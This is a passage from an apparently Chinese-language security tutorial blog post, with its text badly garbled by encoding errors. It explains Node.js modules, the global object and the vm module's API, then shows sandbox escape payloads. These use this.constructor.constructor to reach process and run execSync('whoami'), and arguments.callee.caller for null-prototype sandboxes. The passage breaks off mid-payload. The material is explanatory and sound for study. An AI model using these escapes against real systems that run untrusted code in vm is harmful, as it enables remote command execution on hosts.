class="hljs-literal">undefined</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¼•å…¥å½“å‰ç›®å½•ä¸‹ï¼Œå¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å…ƒç´ ï¼Ÿå¯ä»¥åˆ©ç”¨<code>exports</code>æ¥å£è¾¾åˆ°ç›®çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age<span class="hljs-comment">//exportsæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œç”¨äºå°†æ¨¡å—ä¸­çš„å˜é‡ã€å‡½æ•°æˆ–å¯¹è±¡æš´éœ²ç»™å…¶ä»–æ¨¡å—ä½¿ç”¨</span><br></code></pre></td></tr></table></figure><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//20</span><br></code></pre></td></tr></table></figure><p>è‹¥æ²¡æœ‰exportså°†éœ€è¦çš„å±æ€§æš´éœ²å‡ºæ¥ï¼Œæˆ‘ä»¬æ˜¯è®¿é—®ä¸åˆ°å¦ä¸€ä¸ªåŒ…å†…çš„å±æ€§çš„ã€‚åŒ…ä¸åŒ…ä¹‹é—´æ˜¯äº’ä¸ç›¸é€šçš„ï¼Œå³<code>æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰è‡ªå·±çš„ä½œç”¨åŸŸ</code>ã€‚</p><p><img src="/img/vvv1.png" alt="vvv1"></p><p>(è¿™å¼ å›¾ä»åˆ«äººé‚£é‡Œå·çš„<code>y1</code>&#x3D;<code>bye</code>,<code>y2</code>&#x3D;<code>hello</code>)</p><p><code>global</code>æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨Node.jsä¸­ï¼Œ<code>global</code>æ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œç±»ä¼¼äºæµè§ˆå™¨ç¯å¢ƒä¸­çš„<code>window</code>å¯¹è±¡ã€‚å®ƒå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è®¿é—®ï¼Œæ— éœ€å¼•å…¥æˆ–å£°æ˜ã€‚</p><p><code>global</code>å¯¹è±¡åŒ…å«äº†Node.jsä¸­çš„å…¨å±€å˜é‡å’Œå…¨å±€å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œ<code>console</code>ã€<code>setTimeout</code>ã€<code>setInterval</code>ç­‰å‡½æ•°éƒ½æ˜¯<code>global</code>å¯¹è±¡çš„å±æ€§ã€‚å¯ä»¥é€šè¿‡<code>global</code>å¯¹è±¡æ¥è®¿é—®è¿™äº›å…¨å±€å‡½æ•°å’Œå˜é‡ã€‚</p><p>åœ¨Node.jsä¸­ï¼Œ<code>global</code>å¯¹è±¡è¿˜å¯ä»¥ç”¨æ¥åˆ›å»ºå…¨å±€å˜é‡ã€‚ä½†æ˜¯ï¼Œä¸ºäº†é¿å…å…¨å±€å˜é‡çš„æ»¥ç”¨ï¼Œé€šå¸¸ä¸æ¨èä½¿ç”¨å…¨å±€å˜é‡ï¼Œè€Œæ˜¯ä½¿ç”¨æ¨¡å—çš„å¯¼å‡ºå’Œå¯¼å…¥æœºåˆ¶æ¥è¿›è¡Œå˜é‡çš„å…±äº«å’Œè®¿é—®ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ç”¨<code>console.log</code>è¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆ<code>global.console.log</code>ï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚</p><p>çœ‹ä¸€ä¸ªæœ‰å…³å…¨å±€å˜é‡çš„æ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hello.js</span><br><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><br><span class="hljs-comment">//è¾“å‡ºï¼š</span><br><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘å¹¶æ²¡æœ‰åˆ©ç”¨<code>exports</code>å¯¼å…¥<code>age</code>ï¼Œä½†<code>hello.js</code>ç¡®å®è®¿é—®äº†å¦ä¸€ä¸ªåŒ…çš„å±æ€§ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•<code>new Function</code>:</p><p>åœ¨Node.jsä¸­ï¼Œ<code>new Function</code>æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°å¯¹è±¡ã€‚å®ƒæ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ï¼Œå‰é¢çš„å‚æ•°æ˜¯å‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚</p><p>ä½¿ç”¨<code>new Function</code>æ„é€ å‡½æ•°å¯ä»¥åŠ¨æ€åœ°åˆ›å»ºä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œè€Œä¸éœ€è¦æå‰å®šä¹‰å‡½æ•°çš„åç§°æˆ–å‡½æ•°ä½“ã€‚è¿™ç§æ–¹å¼å¯ä»¥åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå‡½æ•°ï¼Œå…·æœ‰ä¸€å®šçš„çµæ´»æ€§ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> add = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;return a + b;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// è¾“å‡º: 5</span><br></code></pre></td></tr></table></figure><h3 id="0x03vmæ²™ç®±"><a href="#0x03vmæ²™ç®±" class="headerlink" title="0x03vmæ²™ç®±"></a>0x03vmæ²™ç®±</h3><p>å› ä¸ºæ²™ç®±çš„ç›®çš„æ˜¯è¦éš”ç¦»æ¶æ„ä»£ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºæ–°ä½œç”¨åŸŸå¹¶è®©æ¶æ„ä»£ç åœ¨å…¶ä¸­è¿è¡Œè€Œä¸å½±å“å…¶å®ƒä½œç”¨åŸŸï¼Œçœ‹å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIï¼š</p><p><code>vm.runinThisContext(code)</code>:åœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚</p><p><img src="/img/vvv2.png" alt="vvv2"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-comment">//å¯¼å…¥Node,jsçš„vmæ¨¡å—</span><br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<span class="hljs-comment">//å®šä¹‰å˜é‡localVarï¼Œèµ‹å€¼initial value</span><br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<span class="hljs-comment">//ä½¿ç”¨vm.runInThisContextæ–¹æ³•åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­è¿è¡Œæä¾›çš„ä»£ç å­—ç¬¦ä¸²&#x27;localVar = &quot;vm&quot;;&#x27;ã€‚è¯¥ä»£ç çš„ä½œç”¨æ˜¯å°†å˜é‡localVarçš„å€¼ä¿®æ”¹ä¸º&#x27;vm&#x27;ã€‚</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<span class="hljs-comment">//è¾“å‡º</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, </span><br><span class="hljs-comment">//localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ²™ç®±ä¸­æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ<code>&#39;localVar = &quot;vm&quot;;&#39;</code>ï¼Œåªå½±å“æ²™ç®±è¿™ä¸ªä½œç”¨åŸŸï¼Œå¯¹å…¶å®ƒä½œç”¨åŸŸæ²¡å½±å“ã€‚</p><p><code>vm.createContext([sandbox])</code>ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰global<strong>å¤–</strong>å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚</p><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚</p><p><img src="/img/vvv3.png" alt="vvv3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-comment">//å¯¼å…¥utilä»¥ä½¿ç”¨inspectæ–¹æ³•è¾“å‡ºè¯¦ç»†ä¿¡æ¯</span><br>  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<span class="hljs-comment">//å…¨å±€ç¯å¢ƒä¸­å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡globalVarï¼Œå¹¶èµ‹å€¼ä¸º3</span><br>  <span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡sandboxï¼Œå…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºglobalVarçš„å±æ€§ï¼Œå¹¶èµ‹å€¼ä¸º1</span><br>  vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ²™ç®±ä¸Šä¸‹æ–‡ï¼Œå°†æ²™ç®±å¯¹è±¡sandboxä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä»¥ä¾¿åœ¨æ²™ç®±ä¸­æ‰§è¡Œä»£ç ã€‚</span><br>  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<span class="hljs-comment">//ä½¿ç”¨vm.runInContextæ–¹æ³•åœ¨æŒ‡å®šçš„æ²™ç®±ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç å­—ç¬¦ä¸²&#x27;globalVar *= 2;&#x27;ã€‚è¯¥ä»£ç çš„ä½œç”¨æ˜¯å°†æ²™ç®±ä¸­çš„globalVarçš„å€¼ä¹˜ä»¥2</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br><span class="hljs-comment">//æ²™ç®±å†…æ— æ³•å¯¹globalæœ‰ä»»ä½•å½±å“</span><br></code></pre></td></tr></table></figure><p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚</p><p><code>vm.Scriptç±»</code> vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚</p><p><code>new vm.Script(code, options)</code>ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚<br> codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<br><span class="hljs-attr">animal</span>: <span class="hljs-string">&#x27;cat&#x27;</span>,<br><span class="hljs-attr">count</span>: <span class="hljs-number">2</span><br>&#125;;<br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);<br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));<br><span class="hljs-comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></code></pre></td></tr></table></figure><p>scriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚</p><h3 id="0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ"><a href="#0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ" class="headerlink" title="0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ"></a>0x03å¦‚ä½•é€ƒé€¸ï¼Ÿ</h3><p>nodeæ‰§è¡Œ<code>RCE</code>éœ€è¦å¼•å…¥<code>process</code>å¯¹è±¡è¿›è€Œå¯¼å…¥<code>child_process</code>æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤ã€‚ç„¶è€Œï¼Œ<code>process</code>æ˜¯æŒ‚è½½åˆ°globalä¸Šçš„ã€‚å‰é¢çš„ä¾‹å­ä¹Ÿè¯´æ˜äº†åœ¨æ²™ç®±ä¸­è²Œä¼¼ä¸èƒ½è®¿é—®åˆ°<code>global</code>ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•é€ƒé€¸ï¼Ÿå¦‚ä½•æ‹¿åˆ°<code>process</code>ï¼Ÿ</p><p>vmæ¨¡å—æ˜¯éå¸¸ä¸ä¸¥è°¨çš„ï¼ŒåŸºäºnodeåŸå‹é“¾ç»§æ‰¿çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½æ‹¿åˆ°å¤–éƒ¨å…¨å±€å˜é‡ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">//ä¸¥æ ¼æ¨¡å¼</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);<span class="hljs-comment">//è·å–å…¨å±€å¯¹è±¡ global</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">process</span>);<br><span class="hljs-comment">//codeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    this.constructorï¼šè·å–å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„æ„é€ å‡½æ•°ã€‚</span><br><span class="hljs-comment">    this.constructor.constructorï¼šè·å–æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°ï¼Œå³åŸå§‹çš„ Function æ„é€ å‡½æ•°ã€‚</span><br><span class="hljs-comment">    this.constructor.constructor(&#x27;return global&#x27;)()ï¼šé€šè¿‡è°ƒç”¨åŸå§‹çš„ Function æ„é€ å‡½æ•°ï¼Œæ‰§è¡Œå­—ç¬¦ä¸² &#x27;return global&#x27;ï¼Œä»è€Œè·å–å…¨å±€å¯¹è±¡ globalã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/vvv4.png" alt="vvv4"></p><p>è¿™é‡Œçš„<code>this</code>æ˜¯æŒ‡å‘ä¼ é€’åˆ°<code>runInNewContext</code>å‡½æ•°çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»–æ˜¯<strong>ä¸å±äºæ²™ç®±å†…éƒ¨ç¯å¢ƒ</strong>çš„ï¼Œè®¿é—®å½“å‰å¯¹è±¡çš„æ„é€ å™¨çš„æ„é€ å™¨ï¼Œä¹Ÿå°±æ˜¯Functionçš„æ„é€ å™¨ï¼Œç”±äºç»§æ‰¿å…³ç³»ï¼Œå®ƒçš„ä½œç”¨åŸŸæ˜¯å…¨å±€å˜é‡ï¼Œæ‰§è¡Œä»£ç ï¼Œè·å–å¤–éƒ¨globalã€‚æ‹¿åˆ°processå¯¹è±¡å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>());<span class="hljs-comment">//é€šè¿‡ a å¯¹è±¡ä¸­çš„ mainModule å±æ€§ï¼Œè·å–å½“å‰è¿›ç¨‹çš„ä¸»æ¨¡å—å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ require æ–¹æ³•åŠ è½½ child_process æ¨¡å—ï¼Œå¹¶è°ƒç”¨ execSync æ–¹æ³•æ‰§è¡Œå‘½ä»¤ whoamiï¼Œè·å–å½“å‰è¿›ç¨‹çš„ç”¨æˆ·åï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²åæ‰“å°å‡ºæ¥ã€‚</span><br><span class="hljs-comment">//ç»“æœï¼šv1per3\rdj</span><br></code></pre></td></tr></table></figure><p>ä¸€äº›å…¶å®ƒæƒ…å†µï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ sandboxï¼Œä½œä¸ºæ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚è¿™é‡Œä½¿ç”¨ Object.create(null) åˆ›å»ºä¸€ä¸ªæ²¡æœ‰åŸå‹é“¾çš„çº¯å‡€å¯¹è±¡ï¼Œä»¥é¿å…è®¿é—®åˆ°åŸå§‹çš„å…¨å±€å¯¹è±¡(å®ƒä¸ä¼šç»§æ‰¿ä»»ä½•å±æ€§å’Œæ–¹æ³•)</span><br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//vm.createContext æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ contextï¼Œå¹¶å°†ä¹‹å‰åˆ›å»ºçš„ sandbox å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//åœ¨æŒ‡å®šçš„æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œ JavaScript ä»£ç ã€‚script æ˜¯ä¹‹å‰å®šä¹‰çš„ JavaScript ä»£ç å­—ç¬¦ä¸²ï¼Œcontext æ˜¯æ²™ç›’ç¯å¢ƒçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚æ‰§è¡Œç»“æœå°†è¢«èµ‹å€¼ç»™ res å˜é‡ã€‚</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//æ‰“å°è¾“å‡ºå­—ç¬¦ä¸² &#x27;Hello &#x27; å’Œ res å˜é‡çš„å€¼ã€‚</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§<code>arguments.callee.caller</code>ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p><p>æˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„<code>arguments.callee.caller</code>å°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125; //åˆ›å»ºç©ºå¯¹è±¡a</span><br><span class="hljs-string">    a.toString = function () &#123;//å®šä¹‰äº†aä¸­çš„toStringæ–¹æ³•</span><br><span class="hljs-string">      const cc = arguments.callee.caller;//é€šè¿‡ arguments.callee.caller è·å–åˆ°è°ƒç”¨è¯¥æ–¹æ³•çš„å‡½æ•°çš„å¼•ç”¨,åœ¨ä¸‹é¢ä¸¤è¡Œä¸­ç”¨åˆ°</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return 